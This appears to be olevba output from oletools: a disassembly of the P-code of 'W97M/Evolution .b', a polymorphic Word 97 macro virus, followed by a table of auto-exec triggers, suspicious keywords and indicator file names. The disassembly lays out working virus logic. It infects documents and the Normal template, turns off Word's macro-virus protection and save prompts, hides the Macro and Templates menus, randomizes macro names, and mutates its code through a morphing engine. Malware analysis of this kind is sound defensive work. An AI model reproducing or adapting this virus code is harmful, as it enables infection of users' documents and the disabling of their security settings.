' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0008 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St WD 
' Line #354:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld WD 
' 	For 
' Line #355:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #356:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #357:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #358:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #359:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #360:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #361:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #362:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #363:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #364:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #365:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #366:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #367:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #368:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #369:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #370:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #371:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #372:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #373:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #374:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #375:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #376:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #377:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #378:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #379:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #380:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #381:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #382:
' 	Ld VrusName 
' 	Ld a$ 
' 	Add 
' 	St VrusName 
' Line #383:
' 	StartForVariable 
' 	Ld evo 
' 	EndForVariable 
' 	NextVar 
' Line #384:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #385:
' 	Do 
' Line #386:
' 	LitDI2 0x0001 
' 	Ld Virname 
' 	LineInput 
' Line #387:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld Virname 
' 	ParamNamed New 
' 	Ld VrusName 
' 	ParamNamed newname 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #388:
' 	QuoteRem 0x0000 0x0037 " RAPE v1.2 Macro Virus Name Randomizer - 2 to 8 letters"
' Line #389:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	LoopUntil 
' Line #390:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #391:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #392:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo nex 
' 	EndIf 
' Line #393:
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x000C "ThisDocument"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo rite 
' 	EndIf 
' Line #394:
' 	Label rite 
' Line #395:
' 	LitStr 0x001C "C:\windows\system\vnames.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #396:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld x 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	PrintItemNL 
' Line #397:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #398:
' 	Label nex 
' Line #399:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #400:
' 	EndFunc 
' Line #401:
' 	FuncDefn (Function Evolution())
' Line #402:
' 	OnError (Resume Next) 
' Line #403:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #404:
' 	ArgsCall (Call) Self_Recognition 0x0000 
' Line #405:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #406:
' 	ArgsCall (Call) Export_Code 0x0000 
' Line #407:
' 	ArgsCall (Call) Payload 0x0000 
' Line #408:
' 	ArgsCall (Call) Polymorphic_Check 0x0000 
' Line #409:
' 	ArgsCall (Call) Evolve 0x0000 
' Line #410:
' 	Ld Hostinf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Norminf 0x0000 
' 	EndIf 
' Line #411:
' 	Ld FileInf 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) FileInft 0x0000 
' 	EndIf 
' Line #412:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #413:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #414:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #415:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #416:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #417:
' 	QuoteRem 0x0000 0x000F " W97M/Evolution"
' Line #418:
' 	QuoteRem 0x0000 0x002B " W97M/Evolution .b Variant by Nex and Error"
' Line #419:
' 	QuoteRem 0x0000 0x0027 " Polymorphic Stealth Word97 Macro Virus"
' Line #420:
' 	QuoteRem 0x0000 0x001A " All Things Must Change..."
' Line #421:
' 	QuoteRem 0x0000 0x004F " Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error"
' Line #422:
' 	QuoteRem 0x0000 0x0010 " RAPE v1.2 does:"
' Line #423:
' 	QuoteRem 0x0000 0x0045 " Randomly Morphs Source Code by Adding Random Remarks now even better"
' Line #424:
' 	QuoteRem 0x0000 0x003A " Randomly Selects Source Code Export File - Then Morphs it"
' Line #425:
' 	QuoteRem 0x0000 0x0022 " Randomly Creates Virus Macro Name"
' Line #426:
' 	QuoteRem 0x0000 0x0026 " Randomly Adds 1 to 6 Commands to Code"
' Line #427:
' 	EndFunc 
' Line #428:
' 	FuncDefn (Sub AutoClose())
' Line #429:
' 	OnError (Resume Next) 
' Line #430:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #431:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #432:
' 	Ld WordBasic 
' 	ArgsMemCall filesave 0x0000 
' Line #433:
' 	EndSub 
' Line #434:
' 	FuncDefn (Sub AutoExec())
' Line #435:
' 	OnError (Resume Next) 
' Line #436:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #437:
' 	ArgsCall (Call) Armor_Status 0x0000 
' Line #438:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #439:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #440:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #441:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #442:
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0018 "Templates and add-ins..."
' 	LitStr 0x0005 "tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' 	EndIf 
' Line #443:
' 	EndSub 
' Line #444:
' 	FuncDefn (Sub AutoExit())
' Line #445:
' 	OnError (Resume Next) 
' Line #446:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #447:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #448:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	ArgsLd Dir 0x0001 
' 	St PMExport 
' Line #449:
' 	Ld PMExport 
' 	LitStr 0x000B "PMF1199.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PMFile_Yes 
' 	EndIf 
' Line #450:
' 	Ld PMFile_Yes 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #451:
' 	LitStr 0x001D "C:\Windows\System\PMF1199.cpl"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #452:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0018 "W97M/Evolution .b by Nex"
' 	PrintItemNL 
' Line #453:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "Random Arithmetic Polymorphic Engine (RAPE v1.2) by Error"
' 	PrintItemNL 
' Line #454:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #455:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0002 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #456:
' 	LitDI2 0x0002 
' 	Ld FileID 
' 	LineInput 
' Line #457:
' 	LitDI2 0x0002 
' 	Sharp 
' 	Close 0x0001 
' Line #458:
' 	Ld FileID 
' 	LitDI2 0x0009 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #459:
' 	LitDI2 0x0009 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "' EOF"
' 	PrintItemNL 
' Line #460:
' 	LitDI2 0x0009 
' 	Sharp 
' 	Close 0x0001 
' Line #461:
' 	Ld FileID 
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #462:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #463:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St W 
' Line #464:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld W 
' 	For 
' Line #465:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St x 
' Line #466:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St a$ 
' 	EndIf 
' Line #467:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St a$ 
' 	EndIf 
' Line #468:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St a$ 
' 	EndIf 
' Line #469:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St a$ 
' 	EndIf 
' Line #470:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St a$ 
' 	EndIf 
' Line #471:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St a$ 
' 	EndIf 
' Line #472:
' 	Ld x 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St a$ 
' 	EndIf 
' Line #473:
' 	Ld x 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St a$ 
' 	EndIf 
' Line #474:
' 	Ld x 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St a$ 
' 	EndIf 
' Line #475:
' 	Ld x 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St a$ 
' 	EndIf 
' Line #476:
' 	Ld x 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St a$ 
' 	EndIf 
' Line #477:
' 	Ld x 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St a$ 
' 	EndIf 
' Line #478:
' 	Ld x 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St a$ 
' 	EndIf 
' Line #479:
' 	Ld x 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St a$ 
' 	EndIf 
' Line #480:
' 	Ld x 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St a$ 
' 	EndIf 
' Line #481:
' 	Ld x 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St a$ 
' 	EndIf 
' Line #482:
' 	Ld x 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St a$ 
' 	EndIf 
' Line #483:
' 	Ld x 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St a$ 
' 	EndIf 
' Line #484:
' 	Ld x 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St a$ 
' 	EndIf 
' Line #485:
' 	Ld x 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St a$ 
' 	EndIf 
' Line #486:
' 	Ld x 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St a$ 
' 	EndIf 
' Line #487:
' 	Ld x 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St a$ 
' 	EndIf 
' Line #488:
' 	Ld x 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St a$ 
' 	EndIf 
' Line #489:
' 	Ld x 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St a$ 
' 	EndIf 
' Line #490:
' 	Ld x 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St a$ 
' 	EndIf 
' Line #491:
' 	Ld x 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St a$ 
' 	EndIf 
' Line #492:
' 	Ld Filename 
' 	Ld a$ 
' 	Add 
' 	St Filename 
' Line #493:
' 	StartForVariable 
' 	Ld vir 
' 	EndForVariable 
' 	NextVar 
' Line #494:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x03E7 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St False 
' Line #495:
' 	LitStr 0x0012 "C:\windows\system\"
' 	Ld Filename 
' 	Concat 
' 	Ld False 
' 	Concat 
' 	LitStr 0x0004 ".cpl"
' 	Concat 
' 	St FileID2 
' Line #496:
' 	Ld FileID2 
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #497:
' 	Do 
' Line #498:
' 	Label inpux 
' Line #499:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #500:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld stuff 
' 	PrintItemNL 
' Line #501:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #502:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #503:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #504:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #505:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #506:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0002 " '"
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI4 0x967F 0x0098 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	Concat 
' 	St Z$ 
' 	EndIf 
' Line #507:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo inpux 
' 	EndIf 
' Line #508:
' 	LitDI2 0x0004 
' 	Sharp 
' 	PrintChan 
' 	Ld Z$ 
' 	PrintItemNL 
' Line #509:
' 	QuoteRem 0x0000 0x0047 " Source Code Morpher - adds random remarks to Code (RAPE v1.2 by Error)"
' Line #510:
' 	Ld stuff 
' 	LitStr 0x0005 "' EOF"
' 	Eq 
' 	LoopUntil 
' Line #511:
' 	LitDI2 0x0003 
' 	Sharp 
' 	Close 0x0001 
' Line #512:
' 	LitDI2 0x0004 
' 	Sharp 
' 	Close 0x0001 
' Line #513:
' 	LitStr 0x001C "C:\windows\system\export.sys"
' 	ArgsCall Kill 0x0001 
' Line #514:
' 	LitStr 0x001C "C:\windows\system\Export.sys"
' 	LitDI2 0x0005 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #515:
' 	LitDI2 0x0005 
' 	Sharp 
' 	PrintChan 
' 	Ld FileID2 
' 	PrintItemNL 
' Line #516:
' 	LitDI2 0x0005 
' 	Sharp 
' 	Close 0x0001 
' Line #517:
' 	EndSub 
' Line #518:
' 	FuncDefn (Sub AutoNew())
' Line #519:
' 	OnError (Resume Next) 
' Line #520:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #521:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #522:
' 	EndSub 
' Line #523:
' 	FuncDefn (Sub AutoOpen())
' Line #524:
' 	OnError (Resume Next) 
' Line #525:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #526:
' 	ArgsCall (Call) Evolution 0x0000 
' Line #527:
' 	EndSub 
' Line #528:
' 	FuncDefn (Sub FileTemplates())
' Line #529:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #530:
' 	EndSub 
' Line #531:
' 	FuncDefn (Sub ToolsCustomize())
' Line #532:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #533:
' 	EndSub 
' Line #534:
' 	FuncDefn (Sub ToolsMacro())
' Line #535:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #536:
' 	EndSub 
' Line #537:
' 	FuncDefn (Sub ViewVBCode())
' Line #538:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #539:
' 	EndSub 
' Line #540:
' 	QuoteRem 0x0000 0x0035 " "The most polymorphic Macro Virus to date...." - NAI"
' Line #541:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #542:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vnames.cpl          |Executable file name                         |
|IOC       |PMF1199.cpl         |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |import.exe          |Executable file name                         |
|IOC       |data101.cpl         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

